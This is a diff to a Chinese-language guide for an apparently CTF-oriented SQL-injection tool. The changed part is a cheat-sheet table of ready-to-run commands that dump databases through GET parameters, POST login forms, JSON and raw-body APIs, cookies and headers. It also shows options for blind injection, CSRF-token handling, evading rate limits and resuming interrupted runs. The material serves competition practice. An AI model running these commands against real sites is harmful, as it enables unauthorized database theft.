@@ -420,12 +420,15 @@ WAF 还会**按参数分别扫描**：登录框常只过滤用户名不过滤密
 | --- | --- |
 | GET 参数回显页（新闻/详情页） | `cli -u "http://IP/path/news.php?id=1" -p id --dump` |
 | 登录框（POST 双字段） | `cli -u "http://IP/login.php" -p password --method POST --data username=admin password=1 --dump` |
-| JSON/原样 body 的 api | `cli -u "http://IP/api/index.php" -p ip --method PUT --data ip=1 --raw-body --dump` |
+| JSON body 的 api | `cli -u "http://IP/api.php" -p id --method POST --data '{"id":"$$"}' --header "Content-Type=application/json" --dump`（`$$` 为注入标记） |
+| 原样 body 的 api | `cli -u "http://IP/api/index.php" -p ip --method PUT --data ip=1 --raw-body --dump` |
 | 搜索页（布尔盲注） | 同上，回显有差异即可；无差异加 `--time-sec 1` 让时间通道兜底 |
+| 带 CSRF token 的表单 | 加 `--csrf-url "http://IP/form.php" --csrf-field csrf_token`（每请求自动取新 token） |
 | 比赛自造 flag 格式 | 加 `--flag-re "XXCTF\\{[^}]+\\}"`（未命中正确格式时 first-flag 短路会失效） |
 | 有请求限速/封 IP 的平台 | 加 `--max-requests 800 --delay 0.2`；连续空响应≥12 自动硬停保护 |
 | 参数在 Cookie/Header 位 | `--cookie "user=1"` + `-p user`；`--header "X-Forwarded-For=1" + -p` 同理 |
 | 已知表/列想直取 | 加 `--table-hint 表名`（盲注族跳过全库枚举） |
+| 长时间盲注被中断 | 直接重跑同命令即自动续跑（进度存 `runs/progress_*.json`）；从头再来加 `--fresh` |
 
 ### 离线作战清单（开赛前一晚）
 
